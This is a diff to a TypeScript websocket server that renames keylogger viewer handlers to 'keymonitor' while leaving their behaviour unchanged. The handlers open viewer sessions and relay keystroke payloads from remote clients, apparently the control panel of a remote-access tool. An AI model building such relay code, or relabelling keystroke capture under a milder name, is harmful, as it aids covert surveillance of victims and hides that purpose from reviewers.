@@ -338,7 +338,7 @@ export function handleProcessMessage(clientId: string, payload: any) {
   }
 }
 
-export function handleKeyloggerViewerOpen(ws: ServerWebSocket<SocketData>) {
+export function handleKeymonitorViewerOpen(ws: ServerWebSocket<SocketData>) {
   const { clientId, userId, userRole } = ws.data;
   if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
     ws.close(1008, "Forbidden: client access denied");
@@ -347,16 +347,16 @@ export function handleKeyloggerViewerOpen(ws: ServerWebSocket<SocketData>) {
   const sessionId = uuidv4();
   const target = clientManager.getClient(clientId);
   const session = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
-  sessionManager.addKeyloggerSession(session);
+  sessionManager.addKeymonitorSession(session);
   ws.data.sessionId = sessionId;
-  logger.info(`[keylogger] viewer connected session=${sessionId} client=${clientId}`);
+  logger.info(`[keymonitor] viewer connected session=${sessionId} client=${clientId}`);
   safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
   if (!target) {
     safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
   }
 }
 
-export function handleKeyloggerViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
+export function handleKeymonitorViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
   const payload = decodeViewerPayload(raw);
   if (!payload || typeof payload.type !== "string") return;
   const { clientId } = ws.data;
@@ -401,8 +401,8 @@ export function handleKeyloggerViewerMessage(ws: ServerWebSocket<SocketData>, ra
   }
 }
 
-export function handleKeyloggerMessage(clientId: string, payload: any) {
-  for (const session of sessionManager.getKeyloggerSessionsByClient(clientId)) {
+export function handleKeymonitorMessage(clientId: string, payload: any) {
+  for (const session of sessionManager.getKeymonitorSessionsByClient(clientId)) {
     safeSendViewer(session.viewer, payload);
   }
 }
